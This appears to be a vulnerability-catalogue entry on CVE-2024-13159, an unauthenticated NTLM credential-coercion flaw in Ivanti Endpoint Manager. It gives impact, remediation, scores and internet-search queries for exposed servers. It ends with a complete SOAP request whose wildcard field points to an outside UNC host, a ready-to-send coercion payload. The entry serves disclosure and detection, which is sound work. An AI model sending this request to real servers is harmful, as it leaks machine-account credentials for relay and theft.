---
layout: post
cve_id: CVE-2024-13159
title: Ivanti EPM - Credential Coercion Vulnerability in GetHashForWildcardRecursive
pcap: true
pcap_path: /pcaps/2024/CVE-2024-13159.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-13159.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: critical
impact: 'Unauthenticated attackers can coerce NTLM authentication from the EPM server
  via UNC paths, allowing credential theft through man-in-the-middle attacks.

  '
remediation: 'Update Ivanti Endpoint Manager (EPM) to a patched version that addresses
  CVE-2024-13159.

  '
reference:
- https://www.horizon3.ai/attack-research/attack-blogs/ivanti-endpoint-manager-multiple-credential-coercion-vulnerabilities/
- https://nvd.nist.gov/vuln/detail/CVE-2024-13159
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2024-13159
  cwe-id: CWE-36
  epss-score: 0.94138
  epss-percentile: 0.99907
metadata:
  max-request: 1
  shodan-query: http.favicon.hash:362091310
  fofa-query: icon_hash="362091310"
tags:
- cve
- cve2024
- ivanti
- epm
- ntlm
- traversal
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
A vulnerability in Ivanti Endpoint Manager (EPM) allows an unauthenticated attacker to coerce the EPM machine account credential via the GetHashForWildcardRecursive endpoint. The vulnerability exists due to improper input validation in the wildcard parameter, allowing an attacker to specify a remote UNC path that triggers NTLM authentication.


## üåê HTTP Request
```nohighlight
POST /WSVulnerabilityCore/VulCore.asmx HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Content-Length: 463
Accept: */*
Content-Type: text/xml
Soapaction: http://tempuri.org/GetHashForWildcardRecursive
Accept-Encoding: gzip
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetHashForWildcardRecursive xmlns="http://tempuri.org/">
<wildcard>\\d5jj941le0o4dn5oo92g4wzim7mfz8pq4.oast.site\tmp\iyzfg.txt</wildcard>
</GetHashForWildcardRecursive>
</soap:Body>
</soap:Envelope>
```

